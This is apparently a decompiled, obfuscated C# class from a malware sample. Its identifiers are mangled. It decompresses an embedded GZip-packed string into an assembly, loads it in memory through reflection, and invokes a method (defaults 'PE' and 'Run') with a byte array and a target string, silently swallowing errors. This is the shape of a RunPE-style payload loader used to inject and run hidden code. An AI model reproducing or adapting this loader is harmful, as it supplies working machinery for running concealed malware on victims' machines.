using System.IO;
using System.IO.Compression;
using System.Reflection;
using _003F1_003F;

public sealed class _003F8_003F
{
	private static string _003F265_003F = _003F14_003F._003F124_003F(1503);

	private static void _003F119_003F(byte[] _003F163_003F, object[] _003F164_003F, string _003F165_003F = "PE", string _003F166_003F = "Run")
	{
		try
		{
			Assembly _003F218_003F = _003F49_003F._003F157_003F(_003F163_003F);
			MethodInfo _003F218_003F2 = _003F90_003F._003F158_003F(_003F88_003F._003F158_003F(_003F218_003F, _003F165_003F), _003F166_003F);
			_003F54_003F._003F158_003F(_003F218_003F2, null, _003F164_003F);
		}
		catch
		{
		}
	}

	public static void _003F120_003F(byte[] _003F167_003F, string _003F168_003F)
	{
		_003F119_003F(_003F121_003F(_003F265_003F), new object[2] { _003F167_003F, _003F168_003F }, _003F14_003F._003F124_003F(1491), _003F14_003F._003F124_003F(1496));
	}

	private static byte[] _003F121_003F(string _003F169_003F)
	{
		//Discarded unreachable code: IL_0016
		return _003F92_003F._003F157_003F(_003F122_003F(_003F169_003F));
	}

	private static string _003F122_003F(string _003F170_003F)
	{
		//Discarded unreachable code: IL_006e
		byte[] array = _003F92_003F._003F157_003F(_003F170_003F);
		MemoryStream _003F218_003F = _003F55_003F._003F157_003F();
		int num = _003F99_003F._003F157_003F(array, 0);
		_003F43_003F._003F158_003F(_003F218_003F, array, 4, array.Length - 4);
		byte[] array2 = new byte[num - 1 + 1];
		_003F95_003F._003F158_003F(_003F218_003F, 0L);
		GZipStream _003F218_003F2 = _003F50_003F._003F157_003F(_003F218_003F, CompressionMode.Decompress);
		_003F39_003F._003F158_003F(_003F218_003F2, array2, 0, array2.Length);
		return _003F93_003F._003F158_003F(_003F52_003F._003F157_003F(), array2);
	}
}
